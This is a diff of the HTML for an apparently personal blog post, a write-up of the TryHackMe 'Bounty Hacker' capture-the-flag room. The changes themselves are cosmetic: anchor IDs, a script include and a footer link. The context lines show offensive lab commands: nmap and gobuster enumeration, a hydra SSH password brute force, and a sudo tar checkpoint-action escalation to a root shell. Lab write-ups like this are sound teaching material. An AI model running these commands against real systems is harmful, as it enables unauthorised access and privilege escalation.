@@ -6,7 +6,7 @@
 <title>THM: Bounty Hacker</title>
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="generator" content="Org Mode" />
-<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script>
+<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
 </head>
 <body>
 <div id="org-div-home-and-up">
@@ -19,12 +19,12 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org09a964a">Recon</a></li>
-<li><a href="#org336b3aa">The Website</a></li>
-<li><a href="#org9f73aa0">The FTP server</a></li>
-<li><a href="#org345ab3c">The SSH server</a></li>
-<li><a href="#org731895d">Privilege Escalation</a></li>
-<li><a href="#org11ff444">Conclusion</a></li>
+<li><a href="#org1156db0">Recon</a></li>
+<li><a href="#org4139de5">The Website</a></li>
+<li><a href="#org58cc14b">The FTP server</a></li>
+<li><a href="#orgab82a92">The SSH server</a></li>
+<li><a href="#orga89be4e">Privilege Escalation</a></li>
+<li><a href="#org7e67318">Conclusion</a></li>
 </ul>
 </div>
 </div>
@@ -46,14 +46,14 @@ on a medium difficulty room instead of an easy one would be better)!
 </p>
 
 
-<div id="outline-container-org09a964a" class="outline-2">
-<h2 id="org09a964a"><a href="#org09a964a">Recon</a></h2>
-<div class="outline-text-2" id="text-org09a964a">
+<div id="outline-container-org1156db0" class="outline-2">
+<h2 id="org1156db0"><a href="#org1156db0">Recon</a></h2>
+<div class="outline-text-2" id="text-org1156db0">
 <p>
 Like always: a quick <code>nmap</code> scan
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org8f99d2f">IP=10.10.61.63
+<pre class="src src-bash" id="orgbc6a2df">IP=10.10.61.63
 nmap -sV -sC -oN nmap.initial $IP
 </pre>
 </div>
@@ -73,15 +73,15 @@ missed anything, we visit the website.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org5abb8ad">nmap -p- -oN nmap.full -T4 $IP
+<pre class="src src-bash" id="orgfc7ef09">nmap -p- -oN nmap.full -T4 $IP
 </pre>
 </div>
 </div>
 </div>
 
-<div id="outline-container-org336b3aa" class="outline-2">
-<h2 id="org336b3aa"><a href="#org336b3aa">The Website</a></h2>
-<div class="outline-text-2" id="text-org336b3aa">
+<div id="outline-container-org4139de5" class="outline-2">
+<h2 id="org4139de5"><a href="#org4139de5">The Website</a></h2>
+<div class="outline-text-2" id="text-org4139de5">
 <p>
 First things first, after visiting the website it looks like its a
 simple static website, comprised of just one html page, in which
@@ -93,16 +93,16 @@ getting into the target system to us. Nothing is hidden in the html.
 Gobuster also did not reveal any promising files.
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org0d4ed82">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.10.61.63
+<pre class="src src-bash" id="org29432c3">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.10.61.63
 </pre>
 </div>
 </div>
 </div>
 
 
-<div id="outline-container-org9f73aa0" class="outline-2">
-<h2 id="org9f73aa0"><a href="#org9f73aa0">The FTP server</a></h2>
-<div class="outline-text-2" id="text-org9f73aa0">
+<div id="outline-container-org58cc14b" class="outline-2">
+<h2 id="org58cc14b"><a href="#org58cc14b">The FTP server</a></h2>
+<div class="outline-text-2" id="text-org58cc14b">
 <p>
 Using the standard command we can visit the ftp server as <code>anonymous</code>.
 </p>
@@ -110,7 +110,7 @@ Using the standard command we can visit the ftp server as <code>anonymous</code>
 <p>
 If performing any commands returns:
 </p>
-<pre class="example" id="org4aefddb">
+<pre class="example" id="orgad9dc43">
 530 Please login with USER and PASS.
 </pre>
 <p>
@@ -131,15 +131,15 @@ small <i>flag</i></li>
 </div>
 </div>
 
-<div id="outline-container-org345ab3c" class="outline-2">
-<h2 id="org345ab3c"><a href="#org345ab3c">The SSH server</a></h2>
-<div class="outline-text-2" id="text-org345ab3c">
+<div id="outline-container-orgab82a92" class="outline-2">
+<h2 id="orgab82a92"><a href="#orgab82a92">The SSH server</a></h2>
+<div class="outline-text-2" id="text-orgab82a92">
 <p>
 Trying our luck with the wordlist found above, eventually gives us the
 password for the user <code>lin</code>
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org748f6cb">hydra -l lin -P locks.txt ssh://$IP -t 1
+<pre class="src src-bash" id="org0091e2b">hydra -l lin -P locks.txt ssh://$IP -t 1
 </pre>
 </div>
 
@@ -151,9 +151,9 @@ machine, and by visiting lin&rsquo;s Desktop, we get the first actual flag.
 </div>
 
 
-<div id="outline-container-org731895d" class="outline-2">
-<h2 id="org731895d"><a href="#org731895d">Privilege Escalation</a></h2>
-<div class="outline-text-2" id="text-org731895d">
+<div id="outline-container-orga89be4e" class="outline-2">
+<h2 id="orga89be4e"><a href="#orga89be4e">Privilege Escalation</a></h2>
+<div class="outline-text-2" id="text-orga89be4e">
 <p>
 Just running <code>sudo -l</code> shows that we can run <code>/bin/tar</code> as root.
 </p>
@@ -164,16 +164,16 @@ privileges in no time:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="orgd140f47">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+<pre class="src src-bash" id="org5fbc605">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 </pre>
 </div>
 </div>
 </div>
 
 
-<div id="outline-container-org11ff444" class="outline-2">
-<h2 id="org11ff444"><a href="#org11ff444">Conclusion</a></h2>
-<div class="outline-text-2" id="text-org11ff444">
+<div id="outline-container-org7e67318" class="outline-2">
+<h2 id="org7e67318"><a href="#org7e67318">Conclusion</a></h2>
+<div class="outline-text-2" id="text-org7e67318">
 <p>
 It was a nice room, arguably a wrong choice for me, but a good place
 to start I suppose, covering a little bit of the basics. 
@@ -182,7 +182,7 @@ to start I suppose, covering a little bit of the basics.
 </div>
 </div>
 <div id="postamble" class="status">
-<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script> <p class=\"date footer\"> Originally created on 2023-11-05 Sun 21:54</p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.</p>
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script> <p class=\"date footer\"> Originally created on 2023-11-05 Sun 21:54</p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.<br> <a href="https://github.com/chatziiola"> <i class="fa-brands fa-github"></i> </a> </p>
 </div>
 </body>
 </html>
